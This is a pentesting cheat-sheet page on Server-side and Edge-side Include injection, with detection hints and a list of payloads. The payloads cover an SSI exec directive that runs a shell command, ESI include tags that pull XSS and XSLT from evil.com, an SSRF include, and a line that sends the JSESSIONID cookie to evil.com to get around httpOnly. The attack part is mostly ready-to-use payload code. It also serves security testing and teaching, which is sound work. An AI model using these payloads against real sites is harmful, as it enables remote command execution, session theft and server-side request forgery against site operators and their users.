---
description: Server-side Include/Edge-side Includes
---

# SSI/ESI

> Server-side includes and Edge-side includes is a language-neutral web server technology that supports creating dynamic content before rendering a page.

The ESI language is based on a small set of XML tags and is used in many popular HTTP surrogate solutions to tackle performance issues by enabling heavy caching of Web content. ESI tags are used to instruct a reverse-proxy (or a caching server) to fetch more information about a web page for which a template is already cached. This information may come from another server before serving it to the client. This allows fully cached pages to include dynamic content.

### Detection

* Look for **.shtml, .shtm or .stm file extensions** (may include others).&#x20;
* Look for the following **response header: Surrogate-Control: content="ESI/1.0"**&#x20;

### SSI to RCE

```html
<!--#exec cmd="whoami"--> 
```

### ESI to XSS

```bash
#1. Host an html file with an XSS payload inside:
<script>alert(1)</script> 

#2. Inject the following tag:
<esi:include src="http://evil.com/xss.html "/> 
```

### ESI to SSRF

ESI includes are tags which, when processed by the proxy or load balancer, perform a side HTTP request to fetch dynamic content. If an attacker can add an ESI include tag to the HTTP response, they can effectively perform SSRF attacks in the context of the surrogate server (not the application server).

```html
<esi:include src="http://evil.com/" /> 
```

### ESI to bypass httpOnly flag

```html
<esi:include src="http://evil.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" /> 
```

### ESI to RCE (using XSLT)

{% code overflow="wrap" %}
```html
<esi:include src="http://evil.com/file.xml" dca="xslt" stylesheet="http://evil.com/style.xsl" /> 
```
{% endcode %}

### More info at:&#x20;

[Gosecure.net part 1](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)&#x20;

[Gosecure.net part 2](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)&#x20;
